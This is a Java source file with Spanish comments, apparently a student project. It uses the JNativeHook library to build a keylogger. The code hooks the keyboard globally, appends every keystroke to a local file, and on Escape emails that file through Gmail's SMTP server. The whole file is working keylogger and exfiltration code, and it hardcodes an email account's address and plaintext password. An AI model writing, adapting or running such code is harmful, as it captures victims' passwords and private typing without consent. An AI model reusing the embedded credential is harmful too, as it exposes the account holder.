import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent; 
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;


public class jNativeHookExample implements NativeKeyListener{
	
    /* Tecla presionada */
    public void nativeKeyPressed(NativeKeyEvent e) {
    	long startTime = System.currentTimeMillis();
        System.out.println("Tecla presionada: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
        	File fileKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(fileKeyLogger, true);
			writeResults.write(NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			// se cierra la conexión
			writeResults.close();
		} catch (IOException e2) {
			System.out.println("Error al escribir las salidas de teclado");
		}
        //long totalSum =+ (System.currentTimeMillis()-startTime);
        //System.out.println("tiempo de ejecucion en Millis: "+totalSum);
        /* El porgrama finaliza cuando presionamos la tecla ESCAPE (esc) */
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
        	try
            {
              // se obtiene el objeto Session. La configuración es para una cuenta de gmail.
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.setProperty("mail.smtp.starttls.enable", "true");
                props.setProperty("mail.smtp.port", "587");
                props.setProperty("mail.smtp.user", "joaerazogo@unal.edu.co");
                props.setProperty("mail.smtp.auth", "true");

                Session session = Session.getDefaultInstance(props, null);

                // Se compone la parte del texto
                BodyPart texto = new MimeBodyPart();
                texto.setText("Texto del mensaje");

                // Se compone el adjunto con el archivo
                BodyPart adjunto = new MimeBodyPart();
                adjunto.setDataHandler(
                    new DataHandler(new FileDataSource("/home/jose/workspace/Keylogger/FileKeyLogger.txt")));
                adjunto.setFileName("FileKeyLogger.txt");

                // MultiParte para agrupar y añadir texto e imagen.
                MimeMultipart multiPart = new MimeMultipart();
                multiPart.addBodyPart(texto);
                multiPart.addBodyPart(adjunto);

                // Se compone el correo, dando to, from, subject y el contenido.
                MimeMessage messageEmail = new MimeMessage(session);
                messageEmail.setFrom(new InternetAddress("joaerazogo@unal.edu.co"));
                messageEmail.addRecipient(
                    Message.RecipientType.TO,
                    new InternetAddress("joaerazogo@unal.edu.co"));
                messageEmail.setSubject("Hellow");
                messageEmail.setContent(multiPart);

                // Se envia el correo, en este caso gmail.
                Transport t = session.getTransport("smtp");
                t.connect("joaerazogo@unal.edu.co", "MelkorValinor66");
                t.sendMessage(messageEmail, messageEmail.getAllRecipients());
                t.close();
                System.out.println("///////////////////////////////////////////: "+startTime);
                long totalSum = (System.currentTimeMillis());
                System.out.println("tiempo de ejecucion en Millis: "+totalSum);
                
            }
            catch (Exception e1)
            {
                e1.printStackTrace();
            }
            try {
				GlobalScreen.unregisterNativeHook();
				
			} catch (NativeHookException e1) {
				e1.printStackTrace();
			}
            
        }
    }
 
    /* tecla liberada */
    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Tecla liberada: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		try {
			System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//Se cierr
			writeResults.close();
		} catch (IOException e1) {
			System.out.println("Error al escribir en el archivo");
		}
    }
 
    /*Acá se determina que no se encuentra cualquier salida de esta llamada */
    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Tecla mecanografiada: " + e.getKeyText(e.getKeyCode()));
        try {
        	System.out.println("---------------------------------------------");
			File archivoKeyLogger = new File("FileKeyLogger.txt");
			FileWriter writeResults = new FileWriter(archivoKeyLogger, true);
			writeResults.write(e.getKeyText(e.getKeyCode()) + "\r" + "\n");
			//cerramos la conexión
			writeResults.close();
		} catch (IOException e1) {
			System.out.println("Error al escribir");
		}
    }
 
    public static void main(String[] args) {
        try {
            /* Registra JnativeHook, es decir, permite regitrar los eventos del teclado, mouse, etc */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            /* Error */
            e.printStackTrace();
        }
        
        //long startTime = System.currentTimeMillis();
        GlobalScreen.addNativeKeyListener(new jNativeHookExample());
        //long totalSum = (System.currentTimeMillis()-startTime);
        //System.out.println("tiempo de ejecucion en Millis: "+totalSum);
    }
}